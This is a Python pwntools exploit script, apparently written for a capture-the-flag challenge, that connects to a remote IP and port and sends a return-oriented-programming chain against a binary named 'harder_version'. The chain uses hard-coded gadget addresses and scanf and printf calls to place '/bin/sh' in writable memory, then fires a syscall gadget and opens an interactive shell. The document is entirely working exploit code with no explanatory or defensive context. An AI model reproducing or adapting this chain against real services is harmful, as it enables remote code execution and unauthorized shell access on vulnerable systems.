#!/usr/bin/python 

from pwn import *

r = remote('39.108.52.84', 20000)
#r = process('./harder_version')
#context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'debug'
#gdb.attach(r)

syscall_gadget = 0x4006e1

pop_rdi = 0x400773
pop_rsi_r15 = 0x400771

scanf_plt = 0x400550
printf_plt = 0x400510

fmtstr = 0x4007b3
writeable_pos = 0x601100

p = cyclic(24)

def rop_call(rip=0, rdi=0, rsi=0):
	p = ''
	p += p64(pop_rdi)
	p += p64(rdi)
	p += p64(pop_rsi_r15)
	p += p64(rsi)
	p += p64(0xdeadbeeffeedbeef)
	p += p64(rip)
	return p
	
def scanf_call(rdi=0, rsi=0):
	return rop_call(scanf_plt, rdi, rsi)
	
def printf_call(rdi=0, rsi=0):
	return rop_call(printf_plt, rdi, rsi)

p += scanf_call(fmtstr, writeable_pos)
p += scanf_call(fmtstr, writeable_pos + 0x30)

p += printf_call(writeable_pos + 0x30)
p += rop_call(syscall_gadget, writeable_pos, writeable_pos + 0xa0) #writeable_pos + 8)
#p += printf_call(writeable_pos + 0x30)

#raw_input('first payload    ->')

r.sendline(p)
r.sendline('1295')

#raw_input('second payload   ->')

p = ''
p += '/bin/sh\x00'
p += p64(writeable_pos)
p += p64(0)

r.sendline(p)

#raw_input('third payload    ->')

r.send(cyclic(58) + '\n')

r.interactive()
